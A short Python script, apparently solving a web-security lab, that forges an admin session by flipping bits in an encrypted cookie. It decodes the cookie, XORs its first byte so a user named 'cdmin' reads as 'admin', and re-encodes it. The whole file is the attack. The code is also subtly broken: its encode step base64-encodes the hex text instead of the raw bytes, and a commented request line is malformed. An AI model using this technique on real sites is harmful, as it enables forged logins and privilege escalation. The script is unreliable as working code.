import requests
import urllib
import base64
'''
url = 'http://ptl-5760bb97-d0494256.libcurl.so/index.php'
response = requests.post(url,data={"cdmin": "c"}, cookit)
print(response.content)'''
def decode(cookie):
    decode_url = urllib.parse.unquote(cookie)
    decode_base64 = base64.b64decode(decode_url) 
    decode_hex = decode_base64.hex()
    return decode_hex

def encode(cookie):
    cookie = bytes(cookie, 'utf-8')
    decode_base64 = base64.b64encode(cookie)
    #decode_base64 = str(decode_base64)
    decode_url = urllib.parse.quote_plus(decode_base64)
    return decode_url



cookie = input("Enter your cookie - ")
decode_cookie = decode(cookie)
print("decoded cookie - ",decode_cookie)
admin_byte = int(decode_cookie[0:2], 16)^ord('a')^ord('c') #get byte in decimal
print("First byte in decimal - ",admin_byte)
print("First byte in hex - ", hex(admin_byte))
print(str(hex(admin_byte))[2:])
new_cookie = str(hex(admin_byte))[2:] + decode_cookie[2:]
print('decoded new cookie - ',new_cookie)

print("encode new cookie - ", encode(new_cookie))
